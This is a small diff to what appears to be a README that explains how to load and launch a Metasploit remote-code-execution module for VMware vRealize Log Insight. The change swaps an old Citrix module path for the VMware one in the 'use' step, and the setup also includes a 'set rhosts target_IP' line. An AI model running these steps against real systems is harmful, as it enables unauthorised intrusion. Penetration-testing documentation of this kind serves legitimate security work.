@@ -16,7 +16,7 @@ cp vmware_vrli_rce.rb /usr/share/metasploit-framework/modules/exploits/linux/htt
 msfdb reinit; msfconsole -q
 ```
 ```
-use exploits/freebsd/http/citrix_formssso_target_rce
+use exploits/linux/http/vmware_vrli_rce.rb
 ```
 ```
 set rhosts target_IP
